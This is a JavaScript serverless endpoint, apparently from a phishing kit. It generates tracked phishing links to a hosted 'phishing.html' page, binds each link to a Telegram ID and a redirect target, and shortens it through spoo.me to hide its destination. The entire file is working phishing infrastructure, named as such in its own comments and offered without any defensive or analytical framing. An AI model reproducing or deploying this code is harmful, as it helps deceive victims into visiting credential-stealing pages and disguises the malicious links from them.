export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, redirectUrl } = req.body;

    // Validate required fields
    if (!telegramId || !redirectUrl) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Generate unique token
    const token = [...Array(32)].map(() => 
      Math.random().toString(36)[2]).join('');
    
    // Generate phishing URL
    const baseUrl = 'https://opaslabs.vercel.app/phishing/phishing.html';
    const phishingUrl = `${baseUrl}?telegramId=${telegramId}&redirectUrl=${encodeURIComponent(redirectUrl)}&token=${token}`;
    
    // Shorten URL using spoo.me API
    try {
      const shortenResponse = await fetch('https://spoo.me/', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'application/json'
        },
        body: new URLSearchParams({ url: phishingUrl })
      });

      const data = await shortenResponse.json();
      
      // Handle different possible response formats from Spoo.me
      const shortUrl = data.short_url || 
                      (data.url && data.url.short) || 
                      (data.result && data.result.short_url);
      
      if (shortUrl) {
        return res.status(200).json({ link: shortUrl });
      }
      
      // Log API error if no short URL was returned
      console.error('Spoo.me API Error:', data.message || 'Unknown error');
    } catch (shortenError) {
      console.error('URL shortening failed:', shortenError.message);
    }

    // Fallback to original URL if shortening fails
    res.status(200).json({ link: phishingUrl });

  } catch (error) {
    console.error('Generation error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};
